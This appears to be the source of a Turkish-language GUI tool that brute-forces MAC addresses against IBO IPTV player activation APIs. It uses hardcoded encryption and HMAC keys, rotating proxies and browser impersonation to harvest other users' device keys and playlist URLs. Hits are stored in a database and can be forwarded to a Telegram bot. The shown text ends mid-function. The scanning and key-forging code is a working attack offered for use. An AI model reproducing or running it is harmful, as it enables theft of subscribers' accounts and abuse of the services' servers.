# -*- coding: utf-8 -*-
"""
👑 BARON ROKASI - KRALİYET İBO ULTIMATE v18.1 (FULL COMPLETE) 👑
- Tüm hatalar düzeltildi
- 300 Paralel Ultra Hızlı Tarama
- Canlı Grafikler (Emoji hatası yok)
- SQLite Veritabanı & Akıllı Prefix Analizi
- Proxy Yöneticisi & Telegram Bildirimleri
- Altın & Safir & Yakut Profesyonel Arayüz
- Hit Bulunca Dans & Ses Efekti
"""
import sys
import subprocess
import importlib
import os
import threading
import asyncio
import aiohttp
import json
import base64
import hashlib
import hmac
import time
import random
import sqlite3
from datetime import datetime
from collections import defaultdict
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# ==================== KÜTÜPHANE KURULUMU ====================
def ensure_module(mod_name, pip_name=None):
    try:
        importlib.import_module(mod_name)
    except ImportError:
        if pip_name is None:
            pip_name = mod_name
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
        importlib.invalidate_caches()

print("📦 Kütüphaneler kontrol ediliyor...")
ensure_module("aiohttp")
ensure_module("Crypto", "pycryptodome")
ensure_module("curl_cffi")
ensure_module("tkinter")
ensure_module("matplotlib")
print("✅ Kütüphaneler hazır!")

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import cloudscraper
import winsound
from curl_cffi import requests as cffi_requests

import matplotlib
matplotlib.use('TkAgg')
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure

# ==================== VERİTABANI ====================
DB_PATH = "baron_hits.db"

def init_database():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            mac TEXT NOT NULL,
            device_key TEXT,
            url TEXT,
            api_version TEXT,
            prefix TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            total_scanned INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0,
            v1_hits INTEGER DEFAULT 0,
            v2_hits INTEGER DEFAULT 0,
            v3_hits INTEGER DEFAULT 0,
            last_scan DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS prefix_analysis (
            prefix TEXT PRIMARY KEY,
            hit_count INTEGER DEFAULT 0,
            scan_count INTEGER DEFAULT 0,
            success_rate REAL DEFAULT 0.0
        )
    ''')
    
    cursor.execute('SELECT COUNT(*) FROM stats')
    if cursor.fetchone()[0] == 0:
        cursor.execute('INSERT INTO stats DEFAULT VALUES')
    
    conn.commit()
    conn.close()

init_database()

# ==================== PROXY YÖNETİCİSİ ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = set()
        self.load_proxies()
    
    def load_proxies(self):
        try:
            with open("proxy_list.txt", "r", encoding="utf-8") as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            self.proxies = []
    
    def test_proxies(self):
        if not self.proxies:
            return
        
        def test_proxy(proxy_url):
            try:
                proxies = {"http": f"http://{proxy_url}", "https": f"http://{proxy_url}"}
                resp = cffi_requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5, impersonate="chrome120")
                return proxy_url if resp.status_code == 200 else None
            except:
                return None
        
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(test_proxy, self.proxies[:100]))
        
        self.working_proxies = [r for r in results if r]
    
    def get_random_proxy(self):
        if self.working_proxies:
            proxy = random.choice(self.working_proxies)
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        return None

PROXY_MANAGER = ProxyManager()
PROXY_MANAGER.test_proxies()

# ==================== SABİTLER ====================
IBO_HITS_DIR = "BARON_IBO_HITS"
os.makedirs(IBO_HITS_DIR, exist_ok=True)

V1_ENDPOINTS = [
    "https://4kottplayer.com/android-reg",
    "https://my.ibo.tv/android-reg",
    "https://api.iboplayer.net/android-reg"
]

V2_ENDPOINTS = [
    "https://ibobtv.com/api/MBBPj5UwlCmTstXGb/android/playlist_information",
    "https://iboplayer.com/api/MBBPj5UwlCmTstXGb/android/playlist_information",
    "https://iboapp.mimocodes.com/api/MBBPj5UwlCmTstXGb/android/playlist_information",
    "https://api.iboxtv.app/api/MBBPj5UwlCmTstXGb/android/playlist_information"
]

V3_ENDPOINTS = [
    "https://panel.ibopremium.tv/api/v1/device/check",
    "https://secure.iboserver.net/api/v2/verify",
    "https://api.ibomaster.cc/api/v1/auth"
]

V2_PASSPHRASE = "3R%6R2FJ*b5)Vmt84$^eWf0r@r?szdw*fwf*ewd&VXmne$%"
V2_HMAC_KEY = "sUdvdQKtYR54mx1bJEI7huTJxGI4H3bWIZ9ejVYApj6xCbMJrGXRptM8KEyreCOB"

TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

# ==================== YARDIMCI FONKSİYONLAR ====================
def normalize_mac(mac):
    mac = mac.strip().upper().replace(":", "").replace("-", "").replace(".", "")
    if len(mac) != 12 or not mac.isalnum():
        return None
    return ":".join(mac[i:i+2] for i in range(0, 12, 2))

def anahtar_ture(passphrase, salt):
    key_iv = b""
    onceki = b""
    passphrase_bytes = passphrase.encode('utf-8') if isinstance(passphrase, str) else passphrase
    while len(key_iv) < 48:
        onceki = hashlib.md5(onceki + passphrase_bytes + salt).digest()
        key_iv += onceki
    return key_iv[:32], key_iv[32:48]

def sifrele(duz_metin, passphrase):
    if isinstance(duz_metin, str):
        duz_metin = duz_metin.encode('utf-8')
    salt = get_random_bytes(8)
    key, iv = anahtar_ture(passphrase, salt)
    dolgu_uzunluk = 16 - (len(duz_metin) % 16)
    duz_metin_dolgulu = duz_metin + bytes([dolgu_uzunluk] * dolgu_uzunluk)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    sifreli_metin = cipher.encrypt(duz_metin_dolgulu)
    sifreli = b'Salted__' + salt + sifreli_metin
    return base64.b64encode(sifreli).decode('utf-8')

def coz(sifreli_b64, passphrase):
    sifreli = base64.b64decode(sifreli_b64)
    salt_poz = sifreli.find(b'Salted__')
    if salt_poz == -1:
        raise ValueError("OpenSSL format degil")
    salt = sifreli[salt_poz+8:salt_poz+16]
    sifreli_metin = sifreli[salt_poz+16:]
    key, iv = anahtar_ture(passphrase, salt)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    cozulmus = cipher.decrypt(sifreli_metin)
    dolgu_uzunluk = cozulmus[-1]
    if 1 <= dolgu_uzunluk <= 16:
        cozulmus = cozulmus[:-dolgu_uzunluk]
    return cozulmus.decode('utf-8')

def imza_olustur(veri, hmac_key):
    hmac_key_bytes = hmac_key.encode('utf-8') if isinstance(hmac_key, str) else hmac_key
    imza = hmac.new(hmac_key_bytes, veri.encode('utf-8'), hashlib.sha256).digest()
    return base64.b64encode(imza).decode('utf-8')

def send_telegram(mac, device_key, urls):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        message = f"💎 *YENI HIT!*\n\n"
        message += f"📱 *MAC:* `{mac}`\n"
        message += f"🔑 *Key:* `{device_key}`\n"
        message += f"🔗 *URL:* `{urls[0] if urls else 'N/A'}`\n"
        message += f"🕐 {datetime.now().strftime('%H:%M:%S')}"
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        cffi_requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

# ==================== ULTRA TARAMA SINIFI ====================
class UltraScanner:
    def __init__(self, mac_list, max_concurrent=300):
        self.mac_list = mac_list
        self.max_concurrent = max_concurrent
        self.hits = 0
        self.processed = 0
        self.stop_flag = False
        self.api_stats = {"V1": 0, "V2": 0, "V3": 0}
        self.prefix_stats = defaultdict(lambda: {"hits": 0, "scanned": 0})
        self.scraper = cloudscraper.create_scraper()
        self.cffi_session = cffi_requests.Session(impersonate="chrome120")

    async def _check_v1(self, session, mac, endpoint):
        normalized = normalize_mac(mac)
        if not normalized:
            return None
        try:
            payload = {"appType": "android", "macAddress": normalized}
            enc = base64.b64encode(json.dumps(payload).encode()).decode()
            final_payload = {
                "channelId": "IBOPLAYER", "domainId": "IBOAPP",
                "module": "IBO", "requestEnc": enc,
                "requestId": f"req{int(time.time()*1000)}"
            }
            proxy = PROXY_MANAGER.get_random_proxy()
            proxy_str = proxy.get("http") if proxy else None
            headers = {'Content-Type': 'application/json', 'User-Agent': 'okhttp/5.0.0-alpha.2'}
            
            async with session.post(endpoint, json=final_payload, headers=headers, proxy=proxy_str, timeout=8) as resp:
                if resp.status != 200:
                    return None
                js = await resp.json()
                enc_response = js.get("responseData", "")
                if not enc_response:
                    return None
                enc_response += "=" * ((4 - len(enc_response) % 4) % 4)
                try:
                    decoded = base64.b64decode(enc_response).decode("utf-8", errors="ignore")
                except:
                    return None
                if "Succesfully" not in decoded and "C10000" not in decoded and "device_key" not in decoded:
                    return None
                try:
                    data = json.loads(decoded)
                except:
                    data = {}
                device_key = data.get("device_key") or data.get("deviceKey") or "BULUNDU"
                urls = []
                if "url" in data and data["url"]:
                    urls.append(data["url"])
                if "urls" in data:
                    u = data["urls"]
                    if isinstance(u, str):
                        try:
                            u = json.loads(u)
                        except:
                            u = []
                    if isinstance(u, list):
                        for item in u:
                            if isinstance(item, dict) and "url" in item:
                                urls.append(item["url"])
                            elif isinstance(item, str):
                                urls.append(item)
                urls = [u for u in urls if "demo" not in u.lower() and "test" not in u.lower()]
                if urls:
                    return (normalized, device_key, urls, "V1")
        except:
            pass
        return None

    async def _check_v2(self, session, mac, endpoint):
        normalized = normalize_mac(mac)
        if not normalized:
            return None
        try:
            payload = {"mac_address": normalized.upper(), "app_type": "android"}
            encrypted_data = sifrele(json.dumps(payload), V2_PASSPHRASE)
            signature = imza_olustur(encrypted_data, V2_HMAC_KEY)
            request_body = json.dumps({"data": encrypted_data, "signature": signature}).encode('utf-8')
            headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Dalvik/2.1.0 (Android 15)'}
            proxy = PROXY_MANAGER.get_random_proxy()
            proxy_str = proxy.get("http") if proxy else None
            
            async with session.post(endpoint, data=request_body, headers=headers, proxy=proxy_str, timeout=10) as resp:
                if resp.status != 200:
                    return None
                js = await resp.json()
                if 'data' not in js:
                    return None
                try:
                    cozulmus = coz(js['data'], V2_PASSPHRASE)
                    veri = json.loads(cozulmus)
                except:
                    return None
                if veri.get('mac_registered'):
                    device_key = veri.get('device_id', 'V2_BULUNDU')
                    urls = []
                    for p in veri.get('urls', []):
                        if isinstance(p, str):
                            urls.append(p)
                        elif isinstance(p, dict):
                            u = p.get('url', '')
                            if u and "demo" not in u.lower() and "test" not in u.lower():
                                urls.append(u)
                    if urls:
                        return (normalized, device_key, urls, "V2")
        except:
            pass
        return None

    def _check_v3_sync(self, mac, endpoint):
        normalized = normalize_mac(mac)
        if not normalized:
            return None
        try:
            resp = self.cffi_session.post(endpoint, json={"mac": normalized, "key": "Android"}, timeout=12)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success") or data.get("status") == 1:
                    device_key = data.get("device_key", "V3_BULUNDU")
                    m3u_url = data.get("m3u_url") or data.get("url")
                    if m3u_url:
                        return (normalized, device_key, [m3u_url], "V3")
        except:
            try:
                resp = self.scraper.post(endpoint, json={"mac": normalized, "key": "Android"}, timeout=12)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("success"):
                        device_key = data.get("device_key", "V3_BULUNDU")
                        m3u_url = data.get("m3u_url") or data.get("url")
                        if m3u_url:
                            return (normalized, device_key, [m3u_url], "V3")
            except:
                pass
        return None

    async def scan_all(self, progress_callback, result_callback):
        sem = asyncio.Semaphore(self.max_concurrent)
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        timeout = aiohttp.ClientTimeout(total=15)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as v1_session, \
                   aiohttp.ClientSession(connector=connector, timeout=timeout) as v2_session:
            
            async def check_one(mac):
                async with sem:
                    result = None
                    
                    for ep in V1_ENDPOINTS:
                        if self.stop_flag:
                            return mac, None
                        result = await self._check_v1(v1_session, mac, ep)
                        if result:
                            return mac, result
                    
                    for ep in V2_ENDPOINTS:
                        if self.stop_flag:
                            return mac, None
                        result = await self._check_v2(v2_session, mac, ep)
                        if result:
                            return mac, result
                    
                    for ep in V3_ENDPOINTS:
                        if self.stop_flag:
                            return mac, None
                        loop = asyncio.get_running_loop()
                        result = await loop.run_in_executor(None, self._check_v3_sync, mac, ep)
                        if result:
                            return mac, result
                    
                    return mac, None

            tasks = [check_one(mac) for mac in self.mac_list]
            for coro in asyncio.as_completed(tasks):
                if self.stop_flag:
                    break
                mac, result = await coro
                self.processed += 1
                
                normalized = normalize_mac(mac)
                if normalized:
                    prefix = ":".join(normalized.split(":")[:3])
                    self.prefix_stats[prefix]["scanned"] += 1
                
                if result:
                    self.hits += 1
                    api_version = result[3]
                    self.api_stats[api_version] += 1
                    
                    if normalized:
                        prefix = ":".join(normalized.split(":")[:3])
                        self.prefix_stats[prefix]["hits"] += 1
                    
                    result_callback(mac, result)
                
                progress_callback(self.processed, len(self.mac_list), self.hits)

# ==================== GRAFİK SINIFI (EMOJİ HATASI DÜZELTİLDİ) ====================
class LiveGraphs:
    def __init__(self, parent):
        self.parent = parent
        
        self.fig = Figure(figsize=(10, 6), facecolor='#0A0A1A', dpi=120)
        
        self.ax1 = self.fig.add_subplot(221, facecolor='#12123A')
        self.ax1.set_title('API HIT DAGILIMI', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        self.ax2 = self.fig.add_subplot(222, facecolor='#12123A')
        self.ax2.set_title('EN IYI PREFIXLER', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        self.ax3 = self.fig.add_subplot(223, facecolor='#12123A')
        self.ax3.set_title('TARAMA HIZI (MAC/sn)', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        self.ax4 = self.fig.add_subplot(224, facecolor='#12123A')
        self.ax4.set_title('BASARI ORANI', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        for ax in [self.ax1, self.ax2, self.ax3, self.ax4]:
            for spine in ax.spines.values():
                spine.set_color('#3A3A6A')
            ax.tick_params(colors='white', labelsize=8)
        
        self.fig.tight_layout(pad=3.5)
        
        self.canvas = FigureCanvasTkAgg(self.fig, master=parent)
        self.canvas.draw()
        
        self.speed_history = []
        self.time_history = []
        self.start_time = time.time()
        
    def update_graphs(self, api_stats, prefix_stats, total_scanned, total_hits, speed):
        # --- API Pie Chart ---
        self.ax1.clear()
        self.ax1.set_facecolor('#12123A')
        labels = list(api_stats.keys())
        values = list(api_stats.values())
        colors = ['#FFD700', '#7B68EE', '#00FF88']
        explode = (0.05, 0.05, 0.05)
        
        if sum(values) > 0:
            wedges, texts, autotexts = self.ax1.pie(
                values, labels=labels, colors=colors[:len(labels)],
                autopct='%1.1f%%', startangle=90, explode=explode[:len(labels)],
                textprops={'color': 'white', 'fontsize': 10, 'fontweight': 'bold'},
                pctdistance=0.75, labeldistance=1.1
            )
            for autotext in autotexts:
                autotext.set_color('#0A0A1A')
                autotext.set_fontweight('bold')
                autotext.set_fontsize(9)
            
            self.ax1.text(0, 0, f'TOPLAM\n{sum(values)}', ha='center', va='center', 
                         color='#FFD700', fontsize=14, fontweight='bold')
        
        self.ax1.set_title('API HIT DAGILIMI', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        # --- Prefix Bar Chart ---
        self.ax2.clear()
        self.ax2.set_facecolor('#12123A')
        if prefix_stats:
            sorted_prefixes = sorted(prefix_stats.items(), key=lambda x: x[1]['hits'], reverse=True)[:8]
            
            if sorted_prefixes:
                prefixes = [f"{p[0][:8]}.." if len(p[0]) > 8 else p[0] for p in sorted_prefixes]
                hits = [p[1]['hits'] for p in sorted_prefixes]
                
                bar_colors = ['#FFD700', '#FFC107', '#FFB300', '#FFA000', 
                            '#FF8F00', '#FF6F00', '#FFA500', '#FF8C00']
                
                x_pos = range(len(prefixes))
                bars = self.ax2.bar(x_pos, hits, color=bar_colors[:len(prefixes)], 
                                   alpha=0.9, edgecolor='white', linewidth=0.5)
                
                self.ax2.set_xticks(x_pos)
                self.ax2.set_xticklabels(prefixes, color='white', fontsize=8, rotation=45, ha='right')
                self.ax2.tick_params(axis='y', colors='white')
                
                for bar, h in zip(bars, hits):
                    self.ax2.text(bar.get_x() + bar.get_width()/2., bar.get_height() + max(hits)*0.02,
                                 str(h), ha='center', va='bottom', color='#FFD700', fontsize=9, fontweight='bold')
                
                self.ax2.grid(axis='y', alpha=0.2, color='white', linestyle='--')
                self.ax2.set_axisbelow(True)
        
        self.ax2.set_title('EN IYI PREFIXLER (Top 8)', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        # --- Speed Line Chart ---
        self.ax3.clear()
        self.ax3.set_facecolor('#12123A')
        
        current_time = time.time() - self.start_time
        self.speed_history.append(speed)
        self.time_history.append(current_time)
        
        if len(self.speed_history) > 60:
            self.speed_history = self.speed_history[-60:]
            self.time_history = self.time_history[-60:]
        
        if len(self.speed_history) > 1:
            self.ax3.plot(self.time_history, self.speed_history, color='#FFD700', 
                         linewidth=2.5, marker='o', markersize=3, markerfacecolor='#FFA500')
            self.ax3.fill_between(self.time_history, self.speed_history, alpha=0.2, color='#FFD700')
            
            avg_speed = sum(self.speed_history) / len(self.speed_history)
            self.ax3.axhline(y=avg_speed, color='#00FF88', linestyle='--', linewidth=1, 
                           alpha=0.7, label=f'Ort: {avg_speed:.1f}')
            self.ax3.legend(loc='upper right', facecolor='#12123A', edgecolor='#3A3A6A', 
                          labelcolor='white', fontsize=8)
        
        self.ax3.tick_params(axis='both', colors='white')
        self.ax3.grid(alpha=0.2, color='white', linestyle='--')
        self.ax3.set_xlabel('Sure (sn)', color='white', fontsize=9)
        self.ax3.set_ylabel('MAC/sn', color='white', fontsize=9)
        self.ax3.set_title('TARAMA HIZI', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        # --- Success Rate ---
        self.ax4.clear()
        self.ax4.set_facecolor('#12123A')
        
        success_rate = (total_hits / total_scanned * 100) if total_scanned > 0 else 0
        
        self.ax4.barh(0, success_rate, color='#00FF88', height=0.6, alpha=0.9, edgecolor='white', linewidth=0.5)
        self.ax4.barh(0, 100, color='#1A1A4A', height=0.6, alpha=0.3, edgecolor='#3A3A6A', linewidth=0.5)
        
        text_x = success_rate + 3 if success_rate < 50 else success_rate - 15
        self.ax4.text(text_x, 0, f'%{success_rate:.2f}', color='#FFD700', 
                     fontsize=16, fontweight='bold', va='center', ha='center')
        
        self.ax4.text(50, -0.3, f'Taranan: {total_scanned:,}', color='#AAAAFF', fontsize=9, ha='center', va='top')
        self.ax4.text(50, -0.5, f'Hit: {total_hits:,}', color='#00FF88', fontsize=9, ha='center', va='top')
        
        self.ax4.set_xlim(0, 100)
        self.ax4.set_ylim(-1, 1)
        self.ax4.set_yticks([])
        self.ax4.tick_params(axis='x', colors='white', labelsize=8)
        self.ax4.grid(axis='x', alpha=0.2, color='white', linestyle='--')
        self.ax4.set_title('BASARI ORANI', color='#FFD700', fontsize=11, fontweight='bold', pad=10)
        
        self.canvas.draw()

# ==================== ANA GUI ====================
class BaronRokasiApp:
    def __init__(self, root):
        self.root = root
        root.title("👑 BARON ROKASI ULTIMATE v18.1 👑")
        root.geometry("1400x1000")
        root.configure(bg="#0A0A1A")
        
        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("gold.Horizontal.TProgressbar", thickness=25, 
                           troughcolor="#1A1A3A", background="#FFD700")
        
        self.main_container = tk.Frame(root, bg="#0A0A1A")
        self.main_container.pack(fill="both", expand=True)
        
        self.create_header()
        
        content = tk.Frame(self.main_container, bg="#0A0A1A")
        content.pack(fill="both", expand=True, padx=15, pady=10)
        
        left_panel = tk.Frame(content, bg="#0A0A1A")
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 10))
        
        self.create_file_section(left_panel)
        self.create_stats_panel(left_panel)
        self.create_log_section(left_panel)
        
        right_panel = tk.Frame(content, bg="#0A0A1A", width=520)
        right_panel.pack(side="right", fill="both", expand=False)
        right_panel.pack_propagate(False)
        
        self.graphs = LiveGraphs(right_panel)
        self.graphs.canvas.get_tk_widget().pack(fill="both", expand=True)
        
        self.create_footer()
        
        self.dancer_frame = tk.Frame(root, bg="#0A0A1A")
        self.dancer_frame.place(relx=1.0, rely=0.15, anchor="ne", x=-20, y=0)
        self.dancer_label = None
        
        self.running = False
        self.scanner = None
        self.hit_counter = 0
        self.start_time = 0
        self.last_graph_update = 0
        self.api_stats = {"V1": 0, "V2": 0, "V3": 0}
        self.prefix_stats = defaultdict(lambda: {"hits": 0, "scanned": 0})
        
        self.update_graphs_timer()

    def create_header(self):
        header = tk.Frame(self.main_container, bg="#0D0D2B", height=130)
        header.pack(fill="x")
        header_inner = tk.Frame(header, bg="#0D0D2B")
        header_inner.pack(fill="both", expand=True, padx=2, pady=2)
        
        title_frame = tk.Frame(header_inner, bg="#0D0D2B")
        title_frame.pack(pady=(15, 0))
        
        tk.Label(title_frame, text="♦", font=("Segoe UI", 28), fg="#FFD700", bg="#0D0D2B").pack(side="left", padx=(0, 10))
        tk.Label(title_frame, text="BARON ROKASI ULTIMATE", font=("Segoe UI", 32, "bold"),
                fg="#FFD700", bg="#0D0D2B").pack(side="left")
        tk.Label(title_frame, text="♦", font=("Segoe UI", 28), fg="#FFD700", bg="#0D0D2B").pack(side="left", padx=(10, 0))
        
        tk.Label(header_inner, text="✦ ALTIN & SAFIR & YAKUT FULL PACKAGE v18.1 ✦",
                font=("Segoe UI", 11, "italic"), fg="#7B68EE", bg="#0D0D2B").pack(pady=(5, 0))
        
        sep_frame = tk.Frame(header_inner, bg="#0D0D2B")
        sep_frame.pack(fill="x", padx=100, pady=(8, 0))
        tk.Frame(sep_frame, bg="#FFD700", height=2).pack(fill="x")
        tk.Frame(sep_frame, bg="#7B68EE", height=1).pack(fill="x", pady=(1, 0))
        tk.Frame(sep_frame, bg="#00FF88", height=1).pack(fill="x", pady=(1, 0))

    def create_file_section(self, parent):
        card = tk.Frame(parent, bg="#12123A", bd=0, highlightthickness=2, highlightbackground="#FFD700")
        card.pack(fill="x", pady=(0, 10))
        
        tk.Label(card, text="📂 MAC COMBO DOSYASI", font=("Segoe UI", 12, "bold"),
                fg="#FFD700", bg="#12123A").pack(pady=10)
        
        content = tk.Frame(card, bg="#12123A")
        content.pack(fill="x", padx=15, pady=(0, 15))
        
        self.file_path = tk.StringVar()
        tk.Entry(content, textvariable=self.file_path, bg="#0A0A2A", fg="#E0E0FF",
                font=("Consolas", 10), relief="flat", bd=6).pack(fill="x", pady=(0, 10))
        
        btn_frame = tk.Frame(content, bg="#12123A")
        btn_frame.pack(fill="x")
        
        tk.Button(btn_frame, text="🔍 GOZAT", command=self.browse_file,
                 bg="#2A1A6A", fg="#FFD700", font=("Segoe UI", 10, "bold"),
                 padx=15, pady=6, relief="flat", cursor="hand2",
                 activebackground="#4A3A8A").pack(side="left", padx=(0, 10))
        
        tk.Button(btn_frame, text="⚡ ULTRA DERIN TARAMA", command=self.start_scan,
                 bg="#1E7A1E", fg="#FFD700", font=("Segoe UI", 11, "bold"),
                 padx=20, pady=6, relief="flat", cursor="hand2",
                 activebackground="#2E9A2E").pack(side="left")

    def create_stats_panel(self, parent):
        stats_frame = tk.Frame(parent, bg="#12123A", bd=0, highlightthickness=2,
                               highlightbackground="#7B68EE")
        stats_frame.pack(fill="x", pady=(0, 10))
        
        inner = tk.Frame(stats_frame, bg="#12123A")
        inner.pack(fill="x", padx=15, pady=10)
        
        self.progress = ttk.Progressbar(inner, orient="horizontal", length=400,
                                        mode="determinate", style="gold.Horizontal.TProgressbar")
        self.progress.pack(fill="x", pady=(0, 10))
        
        cards = tk.Frame(inner, bg="#12123A")
        cards.pack(fill="x")
        
        # İşlenen
        c1 = tk.Frame(cards, bg="#1A1A4A", bd=1, relief="solid")
        c1.pack(side="left", fill="x", expand=True, padx=(0, 5))
        tk.Label(c1, text="ISLENEN", fg="#7B68EE", bg="#1A1A4A",
                font=("Segoe UI", 9, "bold")).pack(pady=(5, 0))
        self.lbl_proc = tk.Label(c1, text="0", fg="#00E5FF", bg="#1A1A4A",
                                 font=("Segoe UI", 14, "bold"))
        self.lbl_proc.pack(pady=(0, 5))
        
        # Hit
        c2 = tk.Frame(cards, bg="#1A1A4A", bd=1, relief="solid")
        c2.pack(side="left", fill="x", expand=True, padx=5)
        tk.Label(c2, text="HITLER", fg="#7B68EE", bg="#1A1A4A",
                font=("Segoe UI", 9, "bold")).pack(pady=(5, 0))
        self.lbl_hits = tk.Label(c2, text="0", fg="#00FF88", bg="#1A1A4A",
                                 font=("Segoe UI", 18, "bold"))
        self.lbl_hits.pack(pady=(0, 5))
        
        # Hız
        c3 = tk.Frame(cards, bg="#1A1A4A", bd=1, relief="solid")
        c3.pack(side="left", fill="x", expand=True, padx=5)
        tk.Label(c3, text="HIZ", fg="#7B68EE", bg="#1A1A4A",
                font=("Segoe UI", 9, "bold")).pack(pady=(5, 0))
        self.lbl_speed = tk.Label(c3, text="0 MAC/sn", fg="#FFA500", bg="#1A1A4A",
                                  font=("Segoe UI", 14, "bold"))
        self.lbl_speed.pack(pady=(0, 5))
        
        # Başarı
        c4 = tk.Frame(cards, bg="#1A1A4A", bd=1, relief="solid")
        c4.pack(side="left", fill="x", expand=True, padx=(5, 0))
        tk.Label(c4, text="BASARI", fg="#7B68EE", bg="#1A1A4A",
                font=("Segoe UI", 9, "bold")).pack(pady=(5, 0))
        self.lbl_success = tk.Label(c4, text="%0", fg="#FFD700", bg="#1A1A4A",
                                    font=("Segoe UI", 14, "bold"))
        self.lbl_success.pack(pady=(0, 5))
        
        # API istatistikleri
        api_frame = tk.Frame(inner, bg="#12123A")
        api_frame.pack(fill="x", pady=(5, 0))
        
        self.lbl_v1 = tk.Label(api_frame, text="V1: 0", fg="#FFD700", bg="#12123A",
                               font=("Segoe UI", 9, "bold"))
        self.lbl_v1.pack(side="left", padx=(0, 15))
        
        self.lbl_v2 = tk.Label(api_frame, text="V2: 0", fg="#7B68EE", bg="#12123A",
                               font=("Segoe UI", 9, "bold"))
        self.lbl_v2.pack(side="left", padx=15)
        
        self.lbl_v3 = tk.Label(api_frame, text="V3: 0", fg="#00FF88", bg="#12123A",
                               font=("Segoe UI", 9, "bold"))
        self.lbl_v3.pack(side="left", padx=15)
        
        self.btn_stop = tk.Button(inner, text="⏹ DURDUR", command=self.stop_scan,
                                  state="disabled", bg="#8A2020", fg="#FFD700",
                                  font=("Segoe UI", 11, "bold"), padx=20, pady=6,
                                  relief="flat", cursor="hand2",
                                  activebackground="#AA3030")
        self.btn_stop.pack(pady=(10, 0))

    def create_log_section(self, parent):
        log_frame = tk.Frame(parent, bg="#0D0D2B", bd=0, highlightthickness=2,
                             highlightbackground="#FFD700")
        log_frame.pack(fill="both", expand=True)
        
        tk.Label(log_frame, text="📜 CANLI HIT AKISI", font=("Segoe UI", 11, "bold"),
                fg="#FFD700", bg="#1A1A4A").pack(fill="x", pady=8)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=12,
                                                  font=("Consolas", 9),
                                                  bg="#05001A", fg="#CCCCFF",
                                                  relief="flat", bd=0)
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.log_text.tag_config("hit", foreground="#00FF88", font=("Consolas", 10, "bold"))
        self.log_text.tag_config("url", foreground="#66BBFF")
        self.log_text.tag_config("error", foreground="#FF5555")
        self.log_text.tag_config("info", foreground="#AAAAFF")
        self.log_text.tag_config("title", foreground="#FFD700", font=("Consolas", 12, "bold"))
        self.log_text.tag_config("gold", foreground="#FFD700")
        self.log_text.tag_config("sapphire", foreground="#7B68EE")

    def create_footer(self):
        footer = tk.Frame(self.main_container, bg="#0D0D2B", height=30)
        footer.pack(fill="x", side="bottom")
        tk.Label(footer, text="👑 BARON ROKASI ULTIMATE v18.1 | Altin & Safir & Yakut Edition | Full Package 👑",
                font=("Segoe UI", 8), fg="#7B68EE", bg="#0D0D2B").pack(pady=5)

    def log(self, msg, tag="info"):
        def _log():
            self.log_text.insert(tk.END, msg + "\n", tag)
            self.log_text.see(tk.END)
        self.root.after(0, _log)
        
        if tag == "hit":
            self.root.after(0, self.hit_celebration)

    def hit_celebration(self):
        threading.Thread(target=self.play_hit_sound, daemon=True).start()
        self.root.after(0, self.show_dancer)

    def play_hit_sound(self):
        try:
            notes = [800, 1000, 1200, 1600, 2000]
            for note in notes:
                winsound.Beep(note, 80)
                time.sleep(0.04)
        except:
            pass

    def show_dancer(self):
        if self.dancer_label:
            self.dancer_label.destroy()
        
        self.dancer_label = tk.Frame(self.dancer_frame, bg="#0A0A1A")
        self.dancer_label.pack()
        
        emoji = tk.Label(self.dancer_label, text="♦", font=("Segoe UI", 60), fg="#FFD700", bg="#0A0A1A")
        emoji.pack()
        
        text = tk.Label(self.dancer_label, text="HIT!", fg="#FFD700", bg="#0A0A1A",
                       font=("Segoe UI", 16, "bold"))
        text.pack()
        
        def animate(count):
            if count <= 0 or not self.dancer_label:
                if self.dancer_label:
                    self.dancer_label.destroy()
                    self.dancer_label = None
                return
            symbols = ["♦", "◊", "●", "○", "█", "♦"]
            colors = ["#FFD700", "#7B68EE", "#00FF88", "#FFA500", "#FF5555", "#FFD700"]
            try:
                emoji.config(text=symbols[count % len(symbols)], fg=colors[count % len(colors)])
                text.config(fg=colors[count % len(colors)])
            except:
                pass
            self.root.after(100, animate, count-1)
        
